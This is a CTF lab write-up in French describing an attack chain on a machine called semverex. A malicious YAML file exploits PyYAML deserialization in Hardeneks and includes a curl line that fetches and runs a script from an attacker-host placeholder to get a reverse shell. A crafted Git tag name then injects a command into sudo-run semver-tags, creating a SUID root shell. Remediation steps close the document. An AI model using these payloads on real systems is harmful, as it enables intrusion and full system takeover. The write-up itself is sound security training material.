# Writeup CTF - Élévation de Privilèges via Insecure Deserialization & Command Injection

## Informations Générales
- **Cible :** Environnement d'audit EKS (Hardeneks) / Machine semverex
- **Utilisateur Initial :** ETSCTF
- **Privilèges Finaux :** root
- **Vecteurs Principaux :** 
  - Insecure Deserialization (PyYAML) -> SNYK-PYTHON-HARDENEKS-3263422
  - Sudoers Permissif + Command Injection (Node.js) -> CVE-2022-25853 (semver-tags)

---

## 1. Accès Initial & RCE (Remote Code Execution)

### Découverte
Le scan de ports initial révèle un portail web accessible sur le port 1337. Cette interface permet aux utilisateurs d'uploader un fichier de configuration afin d'auditer des clusters Amazon EKS à l'aide de l'outil Hardeneks.

D'après le bulletin de sécurité SNYK-PYTHON-HARDENEKS-3263422, les versions obsolètes de cet outil utilisent la fonction vulnérable yaml.load() de PyYAML pour parser les fichiers importés, ce qui expose l'application à une désérialisation non sécurisée (CWE-502).

### Exploitation (Vecteur d'entrée)
En exploitant la balise de sérialisation d'objets Python !!python/object/apply, il est possible de forcer le serveur à exécuter des commandes système lors de la lecture du fichier YAML. 

Un fichier de configuration malveillant (exploit.yaml) a été téléversé pour initier une attaque en deux étapes (two-stage attack) via un téléchargeur invisible :

```yaml
settings:
  cluster_name: "prod-eks-cluster"

malicious_payload: !!python/object/apply:subprocess.Popen
  - [ "/bin/sh", "-c", "curl -s http://<ATTACKER_IP>/reverse.sh -o /tmp/run.sh && chmod +x /tmp/run.sh && /tmp/run.sh" ]
```

Le script reverse.sh ainsi téléchargé et exécuté a permis d'obtenir un Reverse Shell, établissant un accès initial sur la machine avec les privilèges de l'utilisateur ETSCTF.

---

## 2. Élévation de Privilèges (PrivEsc to Root)

### Énumération Locale
Une fois le pied ancré sur le système, l'inspection des privilèges accordés à notre utilisateur via la commande sudo -l révèle une configuration critique :

```text
User ETSCTF may run the following commands on semverex:
    (ALL) NOPASSWD: /usr/local/bin/semver-tags
```

L'analyse de ce binaire montre qu'il s'agit d'un lien symbolique pointant vers une installation globale du module Node.js semver-tags en version 0.4.10 (/usr/local/lib/node_modules/semver-tags/bin/semver-tags). 

Cette version spécifique est affectée par la faille CVE-2022-25853, une vulnérabilité d'injection de commande (CWE-78). Lorsque l'outil interroge les versions d'un projet, il transmet les noms des tags Git directement à la fonction vulnérable child_process.exec(), qui invoque un interpréteur /bin/sh sans assainir les chaînes de caractères.

### Exploitation (Contournement de la syntaxe Git)
Le script Node.js encapsulant les arguments de la ligne de commande entre des apostrophes simples ('), l'injection directe via l'argument --repo-path se heurtait à des erreurs de syntaxe du shell. Le moyen le plus fiable pour exploiter cette faille consiste à injecter la charge utile directement dans la base de données interne d'un dépôt Git local.

1. Initialisation d'un dépôt Git légitime dans le répertoire de l'utilisateur (/home/ETSCTF) pour éviter les protections de sécurité de Git sur les répertoires partagés (dubious ownership) :
   ```bash
   touch README.md
   git config user.name 'ETSCTF'
   git config user.email 'etsctf@example.com'
   git add README.md
   git commit -m 'Initial'
   ```

2. Création d'un script intermédiaire contenant la charge utile (/tmp/x.sh) pour s'affranchir des restrictions d'espaces du parseur automatisé :
   ```bash
   echo '#!/bin/sh' > /tmp/x.sh
   echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/x.sh
   chmod +x /tmp/x.sh
   ```

3. Injection dans les métadonnées Git : Écriture manuelle du fichier de référence du tag pour y insérer les caractères de contrôle (le point-virgule ; pour clore l'instruction Git et les apostrophes '' pour équilibrer la syntaxe finale de Node.js) :
   ```bash
   HASH=\$(git rev-parse HEAD)
   echo \$HASH > ".git/refs/tags/v1.0.0;'/tmp/x.sh';"
   ```

4. Déclenchement : Exécution du binaire privilégié via sudo sans aucun argument depuis ce dossier. L'outil scanne le répertoire courant, lit le tag piégé et l'exécute dans son sous-shell root :
   ```bash
   sudo /usr/local/bin/semver-tags
   ```

5. Accès final : Le binaire SUID ayant été généré avec succès dans l'emplacement temporaire, il ne reste plus qu'à l'invoquer pour obtenir un shell root permanent :
   ```bash
   /tmp/rootbash -p
   ```
   *Statut : ROOT CONFIRMÉ*

---

## 3. Rapport de Remédiation (Blue Teaming)

Pour sécuriser définitivement ce serveur contre cette chaîne d'attaque, les correctifs suivants doivent être appliqués :

1. Correction de la RCE (Hardeneks) : Mettre à jour le package hardeneks vers la version 0.7.2 (ou supérieure) ou modifier le code source pour remplacer de manière stricte yaml.load() par yaml.safe_load(). Cela interdit l'instanciation d'objets Python complexes lors du parsing des fichiers de configuration.
2. Principe du Moindre Privilège : Révoquer la règle NOPASSWD pour l'outil semver-tags dans le fichier /etc/sudoers. Un utilitaire de gestion de tags applicatifs ne doit pas s'exécuter avec les privilèges d'administration du système.
3. Sécurisation des Processus (Semver-tags) : Mettre à jour le module npm global vers la version 2.0.7 ou supérieure. Le code corrigé utilise désormais execFile(), ce qui transmet les arguments sous forme de tableau isolé au système d'exploitation et neutralise complètement l'évaluation des métacaractères du shell (; , & , | , $() ).
